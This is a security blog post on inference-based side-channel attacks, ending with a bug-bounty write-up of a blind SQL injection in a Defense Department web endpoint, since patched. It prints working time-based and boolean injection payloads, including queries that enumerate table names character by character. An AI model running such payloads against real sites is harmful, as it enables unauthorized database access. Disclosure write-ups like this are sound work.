---
title: "Inference: Side-Channel Attacks"
excerpt: Inference, that is, induction and deduction, are perhaps my personal favorite classes of problem-solving methods.
date: 2021-09-17
ShowToc: true
categories: [appsec]
tags: [appsec]
---

## A Brief History

Inference, that is, induction and deduction, are perhaps my personal favorite classes of problem-solving methods. Given very little initial information, depending on our model and situation, we can utilize just a few points to infer other information which was never directly presented to us. From Pythagoras, to Euclid, and Spinoza—to the use of modern inductive algorithms like those being developed at MIRI—inference is a powerful primitive, and somewhat of a universal open secret, playing a role almost everywhere we look—from philosophy, to economics, game theory, aerospace, medicine, computer science, and any scenario in which probability is of importance. In the spirit of Lewis Carrol:

>[When a person says a thing, they often express another thing they don't mean to reveal.](https://twitter.com/hexagr/status/1014339388380237825)

## In Microprocessors

You may have heard of attacks like Meltdown and Specter, variants of side-channel attacks which broke 
the compartmentalization that was previously assumed in microprocessors. These vulnerabilities 
affected microprocessors that performed an operation known as branch prediction. To put it simply, 
attackers could use JavaScript and HTML5 to exploit a low level design flaw in the microprocessor architecture itself to bypass sandbox mechanisms, leak memory, and predict the instruction flow. Meltdown exploited a race condition and timing attack. Specter exploited time-based errors to infer memory artifacts. In short, simply visiting a webpage was enough to leak private memory and execute code. The papers on [meltdownattack.com](https://meltdownattack.com/), authored by researchers abroad, offer full technical overviews of both attacks. Prior knowledge of how computers work across all the abstraction layers—including architecture design, the features assembly language give us, what C and C++ give us, to kernels and drivers, and how desktop applications operate on top of these layers—are helpful to know if you're curious about the deeper details.

## In Cryptography

Like the above premise, inferential attacks often occur when a cryptosystem can be timed, thus we can glean information about algorithms and key material. In general, cryptographic systems should utilize constant-time algorithms. But this isn't always straightforward. Memory accesses, mathematical operations, and CPU hardware can present technical hurdles. We'll cover cryptography engineering in future posts.

## In Web Applications

Likewise, we find a very similar class of vulnerabilities in web applications. This is usually the result of unsanitized inputs (unparameterized queries) involving databases like MySQL and PostgreSQL, and can lead to various flavors of SQL injection.

## Inferential Injection

While fuzzing the Department Of Defense's Bug Bounty Program for security vulnerabilities, I actually discovered one such web application issue. While doing reconnaissance, glancing over HTTP requests, I found an endpoint making a suspicious call. A server was posting a request like:

```plaintext
POST https://example.deptofdefense.xyz/server/api/this.php HTTP/1.1
Host: example.deptofdefense.xyz
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0)
Content-Length: 404
Origin: https://example.deptofdefense.xyz
Connection: close
Cookie: example=404; PHPSESSID=987654321

// Variables and queries redacted for privacy and brevity
busy=0&phone=1
...
```


There were many variables in this request, but a few of them weren't correctly parameterized. Appending a backtick would throw an error:

```plaintext
https://research.deptofdefense.xyz/server/api/this.php?phone=1' 
```


Performing a time-based payload test by injecting `WAIT FOR DELAY '0:0:10'';` into the vulnerable parameter successfully caused the server's response to be delayed by 10 seconds. It was also possible to perform Boolean tests.

```plaintext
https://research.deptofdefense.xyz/server/api/this.php?phone=1' AND 6=6--
```

Furthermore, we could use Boolean statements to test if very particular conditions returned True or False. For example, if we wanted to see if the string length of the first table in information_schema.tables was five characters, e.g. potentially "`users`":

```plaintext
https://research.deptofdefense.xyz/server/api/this.php?phone=1' AND (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 5 --+
```


It follows that we can iteratively do this, testing each character of the potential table name's ASCII values. It's slow. But this can allow us to enumerate the database. If the request loads successfully, it returned True. Here we test for the ASCII value `117`, or the letter `u`.

```plaintext
https://research.deptofdefense.xyz/server/api/this.php?phone=1' AND (ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1), 1, 1)) = 117)
```


Iterating with this process, it was possible to enumerate and verify various table names in a database as a proof of concept for Boolean/time-based injection. The Department of Defense have since [patched](https://hackerone.com/reports/954667) this vulnerability. When using SQL, always remember to correctly [parameterize your queries](https://blog.codinghorror.com/give-me-parameterized-sql-or-give-me-death/).
